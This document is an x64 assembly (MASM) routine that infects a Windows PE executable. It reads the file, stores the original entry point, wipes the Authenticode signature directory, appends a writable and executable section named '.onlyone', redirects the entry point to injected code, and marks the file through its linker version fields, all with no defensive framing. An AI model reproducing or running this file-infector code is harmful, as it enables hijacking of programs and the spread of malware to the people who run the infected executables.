AddSection PROTO :LPSTR,:LPVOID,:DWORD

.code

AddSection proc uses rbx rcx rdx rsi rdi r8 r9 r10 r11 r12 r13 r14 r15 lpFileName:LPSTR,lpData:LPVOID,dwDataSize:DWORD

    local hFile:HANDLE
    local Buffer:LPVOID
    local dwRawSize:DWORD
    local nBytesRead:DWORD

    mov hFile,FUNC(CreateFile,lpFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0)
    .if hFile == INVALID_HANDLE_VALUE
        invoke LastError
    .endif
    mov rbx,FUNC(GetFileSize,hFile,NULL)
    add eax,dwDataSize
    memalign eax,200h
    mov Buffer,FUNC(VirtualAlloc,0,eax,MEM_COMMIT,PAGE_READWRITE)
    .if !Buffer
        invoke LastError
    .endif
    invoke ReadFile,hFile,Buffer,ebx,addr nBytesRead,0
    .if !eax
        invoke LastError
    .endif    
    invoke CloseHandle,hFile

    mov rsi,FUNC(RtlImageNtHeader,Buffer)
    ; mov OEP
    mov eax,[rsi].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
    mov rcx,lpData
    mov [rcx].INLINE_DATA.OEP,eax

    ; nullification of electronic signature
    mov [rsi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectorySecurity.VirtualAddress,0
    mov [rsi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectorySecurity.isize,0

    ; Adding Section In Header
    movzx eax,[rsi].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
    inc [rsi].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
    mov ebx,eax
    lea ebx,dword ptr[ebx-1]
    mov ecx,sizeof IMAGE_SECTION_HEADER
    mul ecx
    lea rdi,dword ptr[rsi+rax+sizeof IMAGE_NT_HEADERS]
    mov eax,ebx
    mul ecx
    lea r8,dword ptr[rsi+rax+sizeof IMAGE_NT_HEADERS]
    mov rcx,656E6F796C6E6F2Eh
    mov qword ptr[rdi].IMAGE_SECTION_HEADER.Name1,rcx
    mov r9d,[r8].IMAGE_SECTION_HEADER.PointerToRawData
    add r9d,[r8].IMAGE_SECTION_HEADER.SizeOfRawData
    mov [rdi].IMAGE_SECTION_HEADER.PointerToRawData,r9d
    mov r10d,r9d
    mov eax,dwDataSize
    memalign eax,200h
    mov [rdi].IMAGE_SECTION_HEADER.SizeOfRawData,eax
    add r10d,eax
    mov eax,[r8].IMAGE_SECTION_HEADER.VirtualAddress
    add eax,[r8].IMAGE_SECTION_HEADER.Misc.VirtualSize
    mov [rdi].IMAGE_SECTION_HEADER.VirtualAddress,eax
    mov eax,dwDataSize
    memalign eax,1000h
    mov [rdi].IMAGE_SECTION_HEADER.Misc.VirtualSize,eax
    add [rsi].IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage,eax
    mov [rdi].IMAGE_SECTION_HEADER.Characteristics,0E0000020h

    mov rax,5D2A2A2A2A2A2A5Bh
    mov rbx,lpData
    .while TRUE
        .if qword ptr[rbx] == rax
            add rbx,sizeof QWORD
            .break
        .endif
        inc rbx
    .endw
    sub rbx,lpData
    add ebx,[rdi].IMAGE_SECTION_HEADER.VirtualAddress
    mov [rsi].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint,ebx
    
    mov [rsi].IMAGE_NT_HEADERS.OptionalHeader.MajorLinkerVersion,'O'
    mov [rsi].IMAGE_NT_HEADERS.OptionalHeader.MinorLinkerVersion,'N'
    
    add r9,Buffer
    invoke memcpy,r9,lpData,dwDataSize
    invoke SaveToFile,lpFileName,Buffer,r10d
    invoke VirtualFree,Buffer,0,MEM_RELEASE
    ret

AddSection endp